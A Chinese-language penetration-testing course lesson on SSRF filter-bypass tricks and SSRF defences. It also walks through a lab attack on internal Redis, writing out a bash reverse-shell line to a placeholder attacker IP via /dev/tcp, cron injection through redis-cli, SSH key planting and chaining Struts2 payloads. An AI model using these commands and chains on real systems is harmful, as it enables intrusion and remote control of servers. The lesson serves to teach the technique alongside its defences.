# 护网行动红蓝攻防教程：P47：SSRF利用与绕过

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_1.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_3.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_5.png)

## 概述
在本节课中，我们将深入学习SSRF（服务端请求伪造）漏洞的利用与绕过技术。上一节我们介绍了SSRF漏洞的基本概念、危害、寻找方法以及利用方式。本节我们将重点探讨当SSRF漏洞存在防护或限制时，如何进行有效的绕过，并了解其防御措施。课程内容将尽可能简单直白，以便初学者能够理解。

---

## SSRF漏洞利用的绕过方法
上一节我们介绍了SSRF漏洞的利用方式。在实际场景中，目标服务器可能对请求的URL进行各种限制和过滤。本节中我们来看看如何绕过这些常见的限制。

以下是几种常见的SSRF绕过方法：

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_7.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_9.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_11.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_13.png)

1.  **利用@符号**
    通过在URL中使用`@`符号，可以绕过对域名的检查。服务器实际请求的是`@`符号后面的IP地址。
    ```
    http://www.baidu.com@192.168.1.1
    ```

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_15.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_17.png)

2.  **IP地址进制转换**
    将IP地址转换为八进制、十进制或十六进制等形式，可以绕过基于字符串匹配的过滤。
    *   **十进制转换**：`192.168.1.1` 可转换为 `3232235777`。
    *   **八进制转换**：`192.168.1.1` 可转换为 `0300.0250.01.01`。
    *   **十六进制转换**：`192.168.1.1` 可转换为 `0xC0A80101`。

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_19.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_20.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_22.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_24.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_26.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_28.png)

3.  **添加端口号**
    在某些正则匹配规则中，可以通过为目标IP添加端口号（如`:80`）来绕过对纯IP地址的检测。
    ```
    http://192.168.1.1:80
    ```

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_30.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_32.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_34.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_36.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_38.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_40.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_42.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_43.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_45.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_47.png)

4.  **利用xip.io或nip.io域名**
    使用 `xip.io` 或 `nip.io` 这类DNS重定向服务。访问其子域名时，会自动重定向到子域名对应的IP地址。
    ```
    http://192.168.1.1.xip.io
    ```

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_49.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_51.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_53.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_55.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_56.png)

5.  **短地址（URL缩短）服务**
    利用微博、百度等提供的URL缩短服务，将目标内网地址生成一个短链接，从而绕过对直接IP地址的过滤。

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_58.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_59.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_61.png)

6.  **使用句号代替点**
    在某些解析环境下，可以使用句号`.`代替IP地址中的点`.`。
    ```
    http://127。0。0。1  (实际解析为 127.0.0.1)
    ```

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_63.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_65.png)

---

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_67.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_69.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_71.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_73.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_75.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_77.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_79.png)

## SSRF漏洞的防御措施
了解了如何绕过限制后，我们也需要知道如何从防御者的角度来防护SSRF漏洞。有效的防御可以遵循以下几个原则：

以下是主要的防御策略：

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_81.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_83.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_85.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_87.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_89.png)

*   **过滤返回信息**：对服务端请求返回的内容进行严格检查和过滤，防止敏感信息泄露给攻击者。
*   **统一错误信息**：避免通过不同的错误响应（如状态码、响应时间差异）来暴露端口或服务的存活状态。
*   **限制请求端口**：只允许访问常见的Web服务端口（如80、443、8080），禁止访问数据库、SSH等非Web服务端口。
*   **设置IP黑名单**：禁止访问内网IP地址段（如`192.168.0.0/16`，`10.0.0.0/8`，`127.0.0.0/8`）。
*   **禁用非必要协议**：仅允许使用`http://`和`https://`协议，禁用`file://`， `gopher://`， `dict://`等可能带来风险的协议。

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_90.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_92.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_94.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_96.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_98.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_100.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_102.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_104.png)

---

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_106.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_108.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_110.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_112.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_114.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_116.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_118.png)

## 实验内容讲解与答疑
本节我们对上节课留下的实验进行重点讲解，特别是针对利用SSRF攻击内网Redis服务的部分。

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_120.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_122.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_124.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_125.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_127.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_129.png)

### Redis未授权访问与反弹Shell
核心思路是通过SSRF，利用`gopher`协议向目标内网的Redis服务器发送精心构造的数据包，写入定时任务（crontab）来反弹Shell。

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_131.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_133.png)

**关键Payload脚本解析：**
```bash
echo -e "\n\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/攻击者IP/监听端口 0>&1\n\n\n" | redis-cli -h 目标RedisIP -p 6379 -x set 1
```
*   `echo -e`：输出字符串，`\n`代表换行。
*   `*/1 * * * * ...`：这是crontab的语法，表示每分钟执行一次后面的bash命令。
*   `/bin/bash -i >& /dev/tcp/... 0>&1`：经典的bash反弹Shell命令。
*   `redis-cli -h ... -x set 1`：使用Redis客户端连接目标服务器，并将前面echo输出的整个字符串作为值，设置到键名为`1`的键中。

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_135.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_137.png)

**后续步骤：**
1.  通过Redis的`config set dir /var/spool/cron/`命令设置工作目录为系统定时任务目录。
2.  通过`config set dbfilename root`命令设置保存的文件名为`root`（针对root用户的定时任务）。
3.  最后执行`save`命令，将内存中的数据（即我们写入的反弹Shell命令）保存到`/var/spool/cron/root`文件中。
4.  等待一分钟后，定时任务执行，攻击者即可收到反弹的Shell。

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_139.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_140.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_142.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_144.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_146.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_148.png)

### SSH密钥写入与免密登录
另一种利用Redis未授权访问的方式是写入SSH公钥，实现免密登录。

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_150.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_152.png)

**利用流程：**
1.  在攻击机生成SSH密钥对：`ssh-keygen -t rsa`。
2.  将公钥文件（`id_rsa.pub`）的内容进行格式化，构造Redis命令，通过SSRF的`gopher`协议发送到内网Redis服务器。
3.  发送的Redis命令序列会将公钥内容写入到目标服务器的`~/.ssh/authorized_keys`文件中。
4.  攻击者即可直接使用对应的私钥（`id_rsa`）通过SSH免密登录目标服务器。

### Struts2漏洞利用
如果内网存在Struts2等具有远程命令执行漏洞的应用，SSRF可以直接作为攻击通道。通过构造对应的Struts2漏洞利用Payload，并将其作为SSRF请求的目标URL，即可实现对内网应用的攻击。

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_154.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_155.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_157.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_159.png)

**简化流程：**
1.  通过SSRF探测到内网某IP的8080端口存在Struts2应用。
2.  使用公开的Struts2命令执行POC，将其作为SSRF请求的URL。
3.  Payload中可包含下载并执行反弹Shell脚本的命令，从而获得内网目标服务器的权限。

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_161.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_163.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_165.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_167.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_169.png)

---

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_171.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_173.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_174.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_176.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_178.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_180.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_182.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_184.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_185.png)

![](img/ef93f7cf0e7fca234a716653c5cbfe1c_187.png)

## 总结
本节课我们一起学习了SSRF漏洞的高级利用技术。我们探讨了多种绕过服务器限制的方法，包括使用特殊符号、进制转换、域名重定向服务等。同时，我们也从防御角度了解了如何通过过滤、限制协议和端口来缓解SSRF风险。最后，通过详细讲解攻击内网Redis、写入SSH密钥以及利用Struts2漏洞的实例，我们深化了对SSRF漏洞危害和利用链的理解。掌握这些知识，对于进行有效的渗透测试和网络安全防护都至关重要。